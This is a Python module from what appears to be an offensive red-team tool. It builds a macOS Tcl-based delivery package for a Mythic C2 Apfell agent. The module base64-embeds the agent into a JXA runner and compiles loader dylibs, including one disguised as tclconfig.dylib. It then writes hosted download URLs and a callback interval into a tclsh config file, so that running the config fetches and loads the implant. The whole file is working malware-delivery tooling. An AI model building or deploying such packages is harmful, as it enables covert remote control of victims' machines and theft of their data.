import os, base64, asyncio
from .Utilities import *


def tcl_package_hosted():
    temp = "./Templates/Tcl_Dylib_Hosted"
    payload = "./Payloads/Tcl_Dylib_Payload_Hosted"

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Tcl w/ Dylib",
                                           filename="Tcl_JXADylib.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            # Download Payload
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/Tcl_JXADylib.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)  # write out to disk

            # Modify the runner
            templateString = "BASE64 ENCODED APFELL PAYLOAD HERE"
            fin = open(payload + "/Tcl_JXADylib.js", "rt")
            orgPayload = fin.read()
            fin.close()

            # base64 Payload
            message_bytes = orgPayload.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')

            fin = open("./Payloads/Tcl_Dylib_Payload_Hosted/JXADylib_Runner/JSRunner.mm", "rt")
            data = fin.read()
            data = data.replace(templateString, base64_message)
            fin.close()

            fin = open("./Payloads/Tcl_Dylib_Payload_Hosted/JXADylib_Runner/JSRunner.mm", "wt")
            fin.write(data)
            fin.close()

            # Create dylibs
            print("[*] Building Dlopen & JXA Dylibs")
            os.system(
                "g++ -dynamiclib -o /private/tmp/tclconfig.dylib -framework Foundation -framework OSAKit ./Payloads/Tcl_Dylib_Payload_Hosted/JXADylib_Runner/plugin.cpp ./Payloads/Tcl_Dylib_Payload_Hosted/JXADylib_Runner/jsrunner.mm")
            os.system("mv /private/tmp/tclconfig.dylib ./Payloads/Tcl_Dylib_Payload_Hosted/Tcl_Files/tclconfig.dylib")
            os.system(
                "gcc -w -dynamiclib -o /private/tmp/dlopen.dylib ./Payloads/Tcl_Dylib_Payload_Hosted/Tcl_Files/dlopen.c -framework Tcl -framework Tk")
            os.system("mv /private/tmp/dlopen.dylib ./Payloads/Tcl_Dylib_Payload_Hosted/Tcl_Files/dlopen.dylib")

            # Modify callback time & hosted locatations

            fin = open("./Payloads/Tcl_Dylib_Payload_Hosted/Tcl_Files/tclsh85.config", "rt")
            data = fin.read()
            data = data.replace("callback_time", str(mythic_http_callback_interval))
            data = data.replace("URLDLOPEN", str(mythic_dlopendylib_payload))
            data = data.replace("URLAPFELLDYLIB", str(mythic_tcldylib_payload))
            fin.close()
            fin = open("./Payloads/Tcl_Dylib_Payload_Hosted/Tcl_Files/tclsh85.config", "wt")
            fin.write(data)
            fin.close()

            # Clean folders
            os.system("rm ./Payloads/Tcl_Dylib_Payload_Hosted/Tcl_Files/dlopen.c")

            print("[+] Built TCL package at Payloads/Tcl_Dylib_Payload_Hosted")
            print("Notes: \n"
                  "1) Make sure the 'mythic_dlopendylib_payload' and 'mythic_tcldylib_payload' variables were changed in Settings.py to where you plan to host dlopen.dylib and tclconfig.dylib  \n"
                  "2) To run use `tclsh tclsh85.config` within the folder")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
